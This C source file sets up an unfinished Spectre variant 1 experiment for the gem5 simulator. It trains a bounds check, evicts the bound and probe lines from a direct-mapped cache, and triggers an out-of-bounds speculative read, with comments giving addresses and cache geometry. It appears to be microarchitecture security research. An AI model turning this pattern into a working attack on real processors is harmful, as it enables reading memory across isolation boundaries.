#include<stdio.h>
#include<stdlib.h>
#include"/home/tarun-d/Desktop/gem5/include/gem5/m5ops.h"
#include<inttypes.h>
#include<x86intrin.h>

#pragma intrinsic(__rdtsc)

int x,y,z;
int array1[100];
char array2[100]; 
int array3[8192];

int a1_len = 100;

// TODO: full-fledged attack.

// TODO: a1_len must not be #define, rather we'll have to define that value in a variable so that it gets fetched every time. 
//*      This can be done by creating a conflict every time that value is being fetched from the set-associative cache.
//*      This will increase the transient execution time such that we can execute the speculated instructions for a longer amount of time.

/*
 * Considering:
 * Cache Size = 1kB
 * Associativity = 1 (Direct Mapped)
 * Line Size = 64B
 */


void func(int N){                       
    if(N < a1_len){                         //* array2[64] => because array2 is a char array.
        y = array2[64 * array1[N]];         //* => array1[105] = array3[1] = 1  at  0x6bc5e4  ;  array2[0] = 0x6bc3c0
                                        //* array1[105] has been placed in the cache beforehand to lessen the time for accessing that.
    }
}

void fill_cache(){

    for(int k=0;k<256;k=k+16){            
        z = array3[k];
    }
    
}

//TODO Task: Print the program counter.

int main(){
    int i,j;
    printf("\nAddress of a1_len = %p \n" , &a1_len);
    printf("\nAddress of i = %p \n" , &i);
    printf("\nAddress of j = %p \n" , &j);
    printf("\nAddress of x = %p \n" , &x);
    printf("\nAddress of y = %p \n" , &y);
    printf("\nAddress of z = %p \n" , &z);              // 0x6bc424
    printf("\nAddress of array1 = %p \n" , array1);
    printf("\nAddress of array2 = %p \n" , array2);
    printf("\nAddress of array3 = %p \n" , array3);

    

    m5_global_init();           //* Stats are from here.
    m5_dump_reset_stats(0,0);




    array3[1] = 1;              // TODO: array1[105] = 1; So we should get more access time for A2 in the end;

    //*-------------- Initializing array1 ----------------------

    for(i=0;i<100;i++){
        array1[i] = 0;          //* All the 100 accesses for array2[] will be of array2[64*0] == array2[0]
    }
    

    for(j=0;j<100;j++){                 //* Training        
        
        fill_cache();              
        func(j);

    }

    fill_cache();               //* To remove a1_len from cache, to increase the time for transient execution.

    z = array3[128];    //* 0x6bc7e0    //* A1 => To remove array2[0] from cache. Gets mapped to same set as array2[0]
    z = array3[144];    //* 0x6bc820    //* A2 => To remove array2[64] from cache. Gets mapped to same set as array2[64]
    z = array3[1];      //* array3[1] is accessed so that this counts as a hit in func()

    func(105);                          //* Trigger

    




    m5_dump_reset_stats(0,0);
    m5_global_init();

    

    
}